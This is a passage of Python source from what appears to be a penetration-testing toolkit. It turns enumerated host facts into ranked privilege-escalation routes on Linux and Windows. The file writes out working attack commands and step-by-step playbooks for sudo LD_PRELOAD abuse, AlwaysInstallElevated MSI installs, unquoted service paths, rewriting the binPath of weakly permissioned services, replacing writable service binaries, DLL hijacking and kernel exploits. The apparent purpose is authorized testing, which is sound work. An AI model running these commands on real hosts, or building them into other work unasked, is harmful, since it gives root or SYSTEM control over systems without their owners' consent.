                         f"auto-fired: this is a {rule['safety']} route against a client "
                         "host — a failed kernel exploit CAN BSOD."),
                place=remote,
                steps=(
                    f"stage the arsenal copy of `{rule['artifact']}` to {remote} "
                    f"(`fieldkit prep {ctx.host} wincve:{rule['key']} --stage`)",
                    "confirm the exact target build + KB set is still what enum recorded "
                    "(patch state may have changed since)",
                    f"run `{remote}` and capture `whoami` proving nt authority\\system",
                ),
                restore=f"del {remote}"))


def _d_sudo_env(facts, ctx):
    preload = facts.sudo_env_keep & {"LD_PRELOAD", "LD_LIBRARY_PATH"}
    if not preload:
        return
    which = ", ".join(sorted(preload))
    so = f"{ctx.stage_lin}/p.so"
    allowed = sorted(facts.sudo_binaries)
    if allowed:
        # a concrete allowed sudo command to trigger the preload; the .so's constructor
        # runs `id` as root first and that output is captured — a real one-shot proof.
        cmd, builds = allowed[0], (("so", so, "id"),)
        command = f"sudo LD_PRELOAD={so} {cmd}"
        detail = f"sudo keeps {which}; a root .so preloaded before the allowed `{cmd}`."
    else:
        cmd, builds = None, ()
        command = f"# stage a root .so at {so}, then: sudo LD_PRELOAD={so} <an-allowed-cmd>"
        detail = f"sudo keeps {which}; preload a root .so before any allowed sudo command."
    yield Vector(
        key="sudo:env-preload", title=f"sudo preserves {which} → root",
        exploitability="high", safety="config-change", detection="moderate",
        command=command, shell="sh", host=ctx.host, detail=detail,
        evidence=f"sudo -l: env_keep+={which}",
        safe_proof="the preloaded .so runs `id` as root before the command; remove it after.",
        cleanup=f"rm -f {so}", report_type="ld_preload", builds=builds)


def _d_win_privs(facts, ctx):
    seen = set()
    impersonation = facts.privs & _IMPERSONATION_PRIVS
    if impersonation:
        which = ", ".join(sorted(impersonation))
        for spec in WIN_IMPERSONATION:
            yield _impersonation_vector(spec, ctx, evidence=f"whoami /priv: {which}")
        seen.add("seimpersonate")
    for priv in sorted(facts.privs):
        spec = WIN_PRIVS.get(priv)
        if spec and spec["key"] not in seen:
            seen.add(spec["key"])
            yield _win_vector(spec, ctx, evidence=f"whoami /priv: {priv}")
    for group in sorted(facts.win_groups):
        spec = WIN_GROUPS.get(group)
        if spec and spec["key"] not in seen:
            seen.add(spec["key"])
            yield _win_vector(spec, ctx, evidence=f"member of {group}")


def _d_win_aie(facts, ctx):
    if facts.always_install_elevated:
        stage = ctx.stage_win
        yield Vector(
            key="aie", title="AlwaysInstallElevated → SYSTEM",
            exploitability="high", safety="config-change", detection="moderate",
            command=f"msiexec /quiet /qn /i {stage}\\evil.msi",
            shell="cmd", host=ctx.host,
            detail="both AlwaysInstallElevated keys are set — any .msi installs as SYSTEM.",
            evidence="AlwaysInstallElevated=0x1 in HKLM and HKCU",
            safe_proof="build the msi to run `whoami`/add an admin; a SYSTEM whoami proves it.",
            cleanup=f"del {stage}\\evil.msi", report_type="alwaysinstallelevated",
            builds=(("msi", f"{stage}\\evil.msi", None),))


def _d_win_unquoted(facts, ctx):
    stage = ctx.stage_win
    for name, path in facts.unquoted_services:
        # the first space-truncated candidate Windows would try to run
        candidate = path.split(" ", 1)[0] + ".exe"
        if name:
            # plant a payload exe that writes its (SYSTEM) identity, restart the service
            # to trigger it, then read the proof back. On the first fire the file is
            # absent (`type` → not found → the loop builds+plants the exe), on the retry
            # the restarted service ran it as SYSTEM.
            proof = f"{stage}\\up.txt"
            builds = (("exe", candidate, f"cmd /c whoami > {proof}"),)
            command = (f"sc stop {name} & sc start {name} & ping -n 4 127.0.0.1 >nul "
                       f"& type {proof}")
            cleanup = f"del {candidate} & del {proof}"
            detail = (f"unquoted service path {path!r} — plant an exe at {candidate}, "
                      f"restart {name}; it runs as SYSTEM.")
        else:
            builds, cleanup = (), f"del {candidate}"
            command = f"REM plant a payload at {candidate}, then: sc stop <svc> & sc start <svc>"
            detail = f"unquoted service path {path!r} — plant an exe at the first writable candidate."
        yield Vector(
            key=f"unquoted:{path}", title=f"unquoted service path ({name or '?'}) → SYSTEM",
            exploitability="medium", safety="config-change", detection="moderate",
            command=command, shell="cmd", host=ctx.host, detail=detail,
            evidence=f"unquoted service path: {path}",
            safe_proof="check icacls on the candidate's parent dir for a writable ACL first.",
            cleanup=cleanup, report_type="unquoted_service", builds=builds)


def _d_win_weak_service(facts, ctx):
    stage = ctx.stage_win
    for name, binpath in sorted(facts.reconfigurable_services.items()):
        # a native one-shot: repoint binPath to a command that runs as SYSTEM when the
        # SCM starts it (it then read-backs the proof), and restore binPath after. No
        # payload to build — the binPath value *is* the command.
        proof = f"{stage}\\sc_{_slug(name)}.txt"
        yield Vector(
            key=f"weakservice:{name}", title=f"weak service perms ({name}) → SYSTEM",
            exploitability="high", safety="config-change", detection="moderate",
            command=(f'sc config {name} binPath= "cmd /c whoami > {proof}" & '
                     f"sc stop {name} >nul 2>&1 & sc start {name} >nul 2>&1 & "
                     f"ping -n 4 127.0.0.1 >nul & type {proof}"),
            shell="cmd", host=ctx.host,
            detail=f"the ACL on service {name!r} grants SERVICE_CHANGE_CONFIG to a broad "
                   "group — repoint binPath to a SYSTEM command (native, no payload).",
            evidence=f"sc sdshow {name}: change-config granted to a broad principal",
            safe_proof="binPath is set to `whoami`, the service restarted, the result read "
                       "back — then binPath is restored.",
            cleanup=f'sc config {name} binPath= {binpath} & del {proof}',
            report_type="weak_service_perms")


def _slug(name):
    return re.sub(r"[^A-Za-z0-9]", "_", name)


def _d_win_writable_service(facts, ctx):
    # the service binary itself is writable. Overwriting a *running* exe is file-locked,
    # so this is a prepared, operator-driven route: fieldkit builds the payload and stages
    # it to a temp path; the operator stops the service, overwrites, and starts it.
    stage = ctx.stage_win
    for name, exe in sorted(facts.writable_service_bins.items()):
        staged = f"{stage}\\svc_{_slug(name)}.exe"
        yield Vector(
            key=f"writablesvc:{name}", title=f"writable service binary ({name}) → SYSTEM",
            exploitability="high", safety="config-change", detection="moderate",
            command=f"(manual) overwrite {exe} with the built payload, restart {name}",
            shell="cmd", host=ctx.host,
            detail=f"the binary {exe!r} of service {name} is writable by a broad group — "
                   "replace it and restart to run as SYSTEM.",
            evidence=f"icacls {exe}: writable by a broad group",
            report_type="writable_service_binary",
            builds=(("exe", staged, None),),
            playbook=Playbook(
                summary=f"Replace {name}'s writable binary with the built payload.",
                place=exe,
                steps=(
                    f"back up the original: copy \"{exe}\" \"{exe}.bak\"",
                    f"sc stop {name}",
                    f"copy /Y {staged} \"{exe}\"",
                    f"sc start {name}   (it now runs the payload as SYSTEM)",
                ),
                restore=f"sc stop {name} & copy /Y \"{exe}.bak\" \"{exe}\" & sc start {name} "
                        f"& del {staged} \"{exe}.bak\""))


def _d_win_dll_hijack(facts, ctx):
    # a directory the service loads from is writable — plant a DLL it search-order-loads.
    # Which DLL is a target requires Procmon, so this is operator-driven too.
    stage = ctx.stage_win
    for name, dir_ in sorted(facts.writable_service_dirs.items()):
        if name in facts.writable_service_bins:
            continue  # a writable binary is the simpler route — don't offer both
        staged = f"{stage}\\hj_{_slug(name)}.dll"
        yield Vector(
            key=f"dllhijack:{name}", title=f"service DLL hijack ({name}) → SYSTEM",
            exploitability="medium", safety="config-change", detection="moderate",
            command=f"(manual) plant a hijack DLL in {dir_}, restart {name}",
            shell="cmd", host=ctx.host,
            detail=f"the directory {dir_!r} that service {name} loads from is writable — "
                   "plant a DLL it search-order-loads to run as SYSTEM.",
            evidence=f"icacls {dir_}: writable by a broad group",
            report_type="service_dll_hijack",
            builds=(("dll", staged, None),),
            playbook=Playbook(
                summary=f"Plant a hijack DLL in {name}'s writable directory.",
                place=dir_,
                steps=(
                    f"find a DLL {name} loads but can't find (Procmon: filter "
                    "Result='NAME NOT FOUND', Path ends '.dll') — call it X.dll",
                    f"copy /Y {staged} {dir_}\\X.dll   (rename to the missing DLL)",
                    f"sc stop {name} & sc start {name}   (or reboot for a boot-start service)",
                ),
                restore=f"del {dir_}\\X.dll {staged} & sc start {name}"))


#: OS -> the drivers that apply. Append to extend the knowledge base.
DRIVERS = {
    LINUX: (_d_sudo_all, _d_sudo_gtfo, _d_suid_gtfo, _d_caps, _d_docker_group, _d_sudo_env,
            _d_kernel_lpe),
    WINDOWS: (_d_win_privs, _d_win_aie, _d_win_unquoted, _d_win_weak_service,
              _d_win_writable_service, _d_win_dll_hijack, _d_win_lpe),
}


def vectors_for(facts, host_ip, *, stage_win=None, stage_lin=None):
    """Every escalation vector the facts justify on one host, best-ranked first."""
    ctx = _Ctx(host=host_ip,
               stage_win=stage_win or "C:\\Windows\\Temp",
               stage_lin=stage_lin or "/tmp")
    vectors = []
    for driver in DRIVERS.get(facts.os, ()):
        vectors.extend(driver(facts, ctx))
    vectors.sort(key=lambda v: (-v.score, v.key))
    return vectors


def vectors_from_state(store, *, stage_win=None, stage_lin=None):
    """Every privesc vector across every enumerated host, best-ranked first."""
    out = []
    for host in store.hosts():
        facts = facts_for(store, host["id"])
        out.extend(vectors_for(facts, host["ip"], stage_win=stage_win, stage_lin=stage_lin))
    out.sort(key=lambda v: (-v.score, v.host or "", v.key))
    return out


def find_vector(store, host_ip, key, *, stage_win=None, stage_lin=None):
    """The vector with ``key`` on ``host_ip`` from current enum facts, or None."""
    host = store.host_by_ip(host_ip)
    if host is None:
        return None
    facts = facts_for(store, host["id"])
    for vector in vectors_for(facts, host_ip, stage_win=stage_win, stage_lin=stage_lin):
        if vector.key == key:
            return vector
    return None
